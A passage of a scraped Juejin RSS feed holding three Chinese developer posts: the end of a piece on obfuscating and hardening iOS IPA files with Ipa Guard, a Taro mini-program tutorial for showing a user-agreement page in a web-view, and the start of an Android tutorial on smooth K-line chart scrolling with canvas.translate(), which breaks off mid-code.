<p>如果把“加密”理解为算法级保护，那确实很难实现。
但在实际项目里，更现实的目标往往是：</p>
<ul>
<li>增加分析成本</li>
<li>延缓逆向时间</li>
<li>防止资源被直接复用</li>
<li>避免关键符号一眼可读</li>
</ul>
<p>在这种语境下，加密、混淆、清理信息，往往是一起出现的。</p>
<hr/>
<h3 data-id="heading-2"><strong>常见的几种可行手段，以及它们的边界</strong></h3>
<p>在没有源码的前提下，我实际尝试过的方案大致有几类：</p>
<ul>
<li><strong>符号级混淆</strong>：破坏类名、方法名、变量名的可读性</li>
<li><strong>资源处理</strong>：重命名资源、修改校验值，防止直接替换</li>
<li><strong>调试信息清理</strong>：减少可利用信息</li>
<li><strong>重新签名与验证</strong>：确保处理后的包仍可正常运行</li>
</ul>
<p>这些手段单独看都不“神秘”，关键在于<strong>如何组合使用</strong>。</p>
<hr/>
<h3 data-id="heading-3"><strong>为什么 IPA 层工具在这个场景下反而合适</strong></h3>
<p>在多个项目里，最终采用的思路都是：
<strong>不去模拟源码阶段能做的事，而是接受 IPA 阶段的能力边界。</strong></p>
<p>这类工具的优势也很明确：</p>
<ul>
<li>不需要项目工程</li>
<li>不依赖构建环境</li>
<li>对历史版本友好</li>
<li>适合补救与加固</li>
</ul>
<p>在这个阶段，我开始使用 <strong>Ipa Guard</strong> 来承担主要的处理工作。</p>
<hr/>
<h3 data-id="heading-4"><strong>基于 Ipa Guard 的一套实际操作路径</strong></h3>
<p>以下流程并不是标准答案，而是反复调整后的结果。</p>
<h4 data-id="heading-5"><strong>从 IPA 入手，而不是想太多源码细节</strong></h4>
<p>加载 IPA 后，第一步不是急着混淆，而是确认：</p>
<ul>
<li>可执行文件是否正确</li>
<li>是否包含多个二进制</li>
<li>资源结构是否清晰</li>
</ul>
<p>这一步的目的是避免“处理错目标”，尤其是在复杂项目中。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6128045d7b39441084f12d6a4107065a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161681&amp;x-signature=HQYHEImEXcgyeYHToNdRxsF3z4s%3D" alt="加载ipa" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-6"><strong>在代码层，只处理“值得处理的部分”</strong></h4>
<p>Ipa Guard 提供了对 OC / Swift 类、方法、参数、变量的混淆能力。
在没有源码的情况下，我通常会：</p>
<ul>
<li>通过名称和模块判断业务相关性</li>
<li>避开系统类和明显的第三方 SDK</li>
<li>控制混淆强度，避免影响运行稳定性</li>
</ul>
<p>混淆后的符号变成无意义字符串，对静态分析的干扰非常直接。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8d148ba65a346a78c5bc16fab482c5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161681&amp;x-signature=J5pSxwgkrJb3u%2BHz7UhQwyuRtDg%3D" alt="代码混淆" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-7"><strong>资源层的处理，往往比预期更重要</strong></h4>
<p>很多人低估了资源层的价值。
实际上，在不少应用中，业务线索反而藏在：</p>
<ul>
<li>JSON 配置</li>
<li>HTML / JS</li>
<li>图片命名规则</li>
</ul>
<p>通过对这些资源进行重命名、修改 MD5，能明显降低被直接复用的可能性。
Ipa Guard 在这一步的操作比较直观，也更容易验证效果。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a6471a9aea5485fa6586b57be143802~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv6LCB55qE56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769161681&amp;x-signature=8o04JiItGxa6LjfQp2MGMPbQNWU%3D" alt="文件混淆" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-8"><strong>清理调试信息，是顺手但必要的一步</strong></h4>
<p>即使不追求极致安全，清理调试信息也是值得做的事情。
它并不会改变功能，却能减少很多“现成线索”。</p>
<p>在没有源码的场景下，这一步的性价比其实很高。</p>
<hr/>
<h4 data-id="heading-9"><strong>重签名与测试，决定这套方案是否可用</strong></h4>
<p>处理完成后，需要重新配置证书并安装测试。
我通常会优先验证：</p>
<ul>
<li>启动是否正常</li>
<li>核心页面是否可用</li>
<li>是否存在资源加载异常</li>
</ul>
<p>确认无误后，保存配置，后续版本可以直接复用这一套流程。</p>
<hr/>
<h3 data-id="heading-10"><strong>多工具组合，而不是把希望压在单点上</strong></h3>
<p>需要强调的是，这类 IPA 处理工具并不适合“单独承担所有安全责任”。
在项目中，我通常会配合：</p>
<ul>
<li>服务端校验</li>
<li>接口签名</li>
<li>简单的完整性检测</li>
</ul>
<p>这样做的目的，是把风险分散到不同层面，而不是集中在某一个点。</p>
<hr/>
<h3 data-id="heading-11"><strong>哪些场景下，这种方式比较合适</strong></h3>
<p>从经验来看，这种“无源码加密”的思路更适合：</p>
<ul>
<li>外包或合作项目的后期保护</li>
<li>历史 App 的安全补救</li>
<li>多平台混合项目</li>
<li>对源码外泄高度敏感的团队</li>
</ul>
<p>如果期望的是“绝对不可破解”，那一开始就不在同一个讨论范围内。</p>
<hr/>
<p>没有源码并不意味着只能被动接受风险。
在 IPA 层做加密与混淆，更像是一种工程上的妥协，不追求完美，但尽量让事情变得不那么容易。</p>
<p>参考链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fipaguard.com%2Ftutorial%2Fzh%2F1%2F1.html" target="_blank" title="https://ipaguard.com/tutorial/zh/1/1.html" ref="nofollow noopener noreferrer">ipaguard.com/tutorial/zh…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[小程序增加用户协议]]></title>    <link>https://juejin.cn/post/7595771085394165811</link>    <guid>https://juejin.cn/post/7595771085394165811</guid>    <pubDate>2026-01-16T09:55:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595771085394165811" data-draft-id="7595774188909821990" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="小程序增加用户协议"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-16T09:55:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一涯"/> <meta itemprop="url" content="https://juejin.cn/user/1275089219491213"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            小程序增加用户协议
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1275089219491213/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一涯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:55:57.000Z" title="Fri Jan 16 2026 09:55:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    21
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-js" lang="js">在小程序中增加一个用户协议
</code></pre>
<h2 data-id="heading-0">1.开发用户协议页面</h2>
<p>在一个内部网站上开发一个用户协议的页面。</p>
<h2 data-id="heading-1">2.在小程序开发者后台添加业务域名</h2>
<p>添加的时候，会给一个验证码文件。下载下来。</p>
<h2 data-id="heading-2">3. 将验证码文件放在用户协议所在网站的根目录</h2>
<h2 data-id="heading-3">4. 在小程序中使用webview加载网页链接</h2>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"settings-page"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">view</span>
        <span class="hljs-attr">class</span>=<span class="hljs-string">"list-item"</span>
        @<span class="hljs-attr">tap</span>=<span class="hljs-string">"openPage(userAgreementUrl)"</span>
      &gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>用户协议<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"arrow"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span></span>
  &lt;view&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-view</span>
        <span class="hljs-attr">v-if</span>=<span class="hljs-string">"userAgreementUrl"</span>
        <span class="hljs-attr">:src</span>=<span class="hljs-string">"userAgreementUrl"</span>
    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-view</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Taro</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@tarojs/taro'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-variable constant_">USER_AGREEMENT_URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/config/legal'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'settings-page'</span>,
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">userAgreementUrl</span>: <span class="hljs-variable constant_">USER_AGREEMENT_URL</span>,
    }
  },
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-title function_">openPage</span>(<span class="hljs-params">url</span>) {
      <span class="hljs-keyword">if</span> (!url) {
        <span class="hljs-title class_">Taro</span>.<span class="hljs-title function_">showToast</span>({
          <span class="hljs-attr">title</span>: <span class="hljs-string">'链接未配置'</span>,
          <span class="hljs-attr">icon</span>: <span class="hljs-string">'none'</span>
        })
        <span class="hljs-keyword">return</span>
      }
      <span class="hljs-keyword">const</span> target = <span class="hljs-built_in">encodeURIComponent</span>(url)
      <span class="hljs-title class_">Taro</span>.<span class="hljs-title function_">navigateTo</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">`/pages/webview/webview?url=<span class="hljs-subst">${target}</span>`</span>
      })
    }
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>其中legal文件代码如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">USER_AGREEMENT_URL</span> = <span class="hljs-string">'https:/XXXXXXX/privacy/user.html'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[绘制K线第四章：滚动优化]]></title>    <link>https://juejin.cn/post/7595615310181040182</link>    <guid>https://juejin.cn/post/7595615310181040182</guid>    <pubDate>2026-01-16T10:10:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595615310181040182" data-draft-id="7595502583269474340" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="绘制K线第四章：滚动优化"/> <meta itemprop="keywords" content="前端,架构,Android"/> <meta itemprop="datePublished" content="2026-01-16T10:10:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="佛系打工仔"/> <meta itemprop="url" content="https://juejin.cn/user/3227821867282167"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            绘制K线第四章：滚动优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3227821867282167/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    佛系打工仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:10:27.000Z" title="Fri Jan 16 2026 10:10:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">滚动优化</h2>
<p>在第三章的基础上，我们发现 Case4 的拖拽功能存在一个问题：只能整根整根地绘制K线，拖拽体验不够平滑。本章介绍如何通过 <code>canvas.translate()</code> 实现像素级滚动来解决这个问题。</p>
<h3 data-id="heading-1">一、问题分析</h3>
<h4 data-id="heading-2">Case4 的问题</h4>
<p>Case4 在计算可见区间时，使用了以下逻辑：</p>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">scrollIndex</span> = (scroll<span class="hljs-literal">Off</span>set / totalCandleWidth).toInt()  // 转换为K线索引偏移
val <span class="hljs-attr">startIndex</span> = (baseStartIndex - scrollIndex).coerceIn(...)
</code></pre>
<p><strong>问题</strong>：</p>
<ul>
<li><code>scrollIndex</code> 是通过 <code>toInt()</code> 转换的，只能按整根K线计算</li>
<li>拖拽时，K线只能整根整根地移动，无法显示半根K线</li>
<li>拖拽体验不够平滑，感觉"卡顿"</li>
</ul>
<h4 data-id="heading-3">Case4 的绘制方式</h4>
<p>Case4 在绘制每根K线时，需要手动计算X坐标并加上 <code>pixelOffset</code>：</p>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">centerX</span> = index * totalCandleWidth + config.candleWidth / <span class="hljs-number">2</span> + <span class="hljs-literal">off</span>setX
</code></pre>
<p>这种方式存在以下问题：</p>
<ol>
<li><strong>代码复杂</strong>：每根K线都需要单独计算X坐标</li>
<li><strong>可见区间计算不精确</strong>：只能按整根K线计算可见范围</li>
<li><strong>边界处理复杂</strong>：需要处理半根K线的显示问题</li>
</ol>
<h3 data-id="heading-4">二、解决方案：使用 canvas.translate()</h3>
<h4 data-id="heading-5">canvas.translate() 的原理</h4>
<p><code>canvas.translate()</code> 是 Android Canvas 提供的一个坐标系变换方法，用于平移整个坐标系。</p>
<p><strong>工作原理</strong>：</p>
<ol>
<li><strong>保存画布状态</strong>：<code>canvas.save()</code> 保存当前的变换矩阵</li>
<li><strong>平移坐标系</strong>：<code>canvas.translate(dx, dy)</code> 将整个坐标系平移 (dx, dy)</li>
<li><strong>绘制内容</strong>：在平移后的坐标系中绘制，所有坐标都会自动偏移</li>
<li><strong>恢复画布状态</strong>：<code>canvas.restore()</code> 恢复之前的变换矩阵</li>
</ol>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.save</span>()
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.translate</span>(-<span class="hljs-number">100</span>f, <span class="hljs-number">0</span>f)  <span class="hljs-comment">// 将坐标系向左平移100像素</span>
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.drawRect</span>(<span class="hljs-number">0</span>f, <span class="hljs-number">0</span>f, <span class="hljs-number">50</span>f, <span class="hljs-number">50</span>f, paint)  <span class="hljs-comment">// 实际绘制在屏幕的 (-100, 0) 位置（会被裁剪）</span>
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.restore</span>()
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.drawRect</span>(<span class="hljs-number">0</span>f, <span class="hljs-number">0</span>f, <span class="hljs-number">50</span>f, <span class="hljs-number">50</span>f, paint)  <span class="hljs-comment">// 实际绘制在屏幕的 (0, 0) 位置</span>
</code></pre>
<h4 data-id="heading-6">为什么 translate() 能实现半根K线？</h4>
<p><strong>关键理解</strong>：translate() 平移的是坐标系，而不是画布本身。Canvas 会自动裁剪超出屏幕的部分。</p>
<p><strong>原理</strong>：</p>
<ol>
<li><strong>坐标系平移</strong>：<code>canvas.translate(translateX, 0f)</code> 平移坐标系</li>
<li><strong>基于像素计算可见范围</strong>：</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">leftLogicalX</span> = -translateX      // 屏幕左边界在逻辑坐标系中的位置
val <span class="hljs-attr">rightLogicalX</span> = -translateX + width  // 屏幕右边界在逻辑坐标系中的位置
</code></pre>
<p>3.  <strong>Canvas 自动裁剪</strong>：如果K线的一部分在屏幕外，Canvas 会自动裁剪，实现"半根K线"的效果</p>
<h3 data-id="heading-7">三、核心实现</h3>
<h4 data-id="heading-8">1. 计算 translateX（坐标系平移量）</h4>
<p><strong>核心思想</strong>：</p>
<ul>
<li><code>scrollX = 0</code> 时：最后一根K线的右边界对齐屏幕右边界</li>
<li><code>scrollX = minScrollX</code> 时：第一根K线的左边界对齐屏幕左边界</li>
</ul>
<p><strong>计算方式</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">calculateTranslateX</span><span class="hljs-params">(screenWidth: <span class="hljs-type">Float</span>, totalCandleWidth: <span class="hljs-type">Float</span>)</span></span>: <span class="hljs-built_in">Float</span> {
    <span class="hljs-keyword">val</span> minScrollX = getMinScrollX()
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (minScrollX &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 线性映射：scrollX 从 0 到 minScrollX，translateX 从 minTranslateX 到 maxTranslateX</span>
        <span class="hljs-keyword">val</span> minTranslateX = screenWidth - klineData.size * totalCandleWidth
        <span class="hljs-keyword">val</span> maxTranslateX = <span class="hljs-number">0f</span>
        (scrollX / minScrollX) * (maxTranslateX - minTranslateX) + minTranslateX
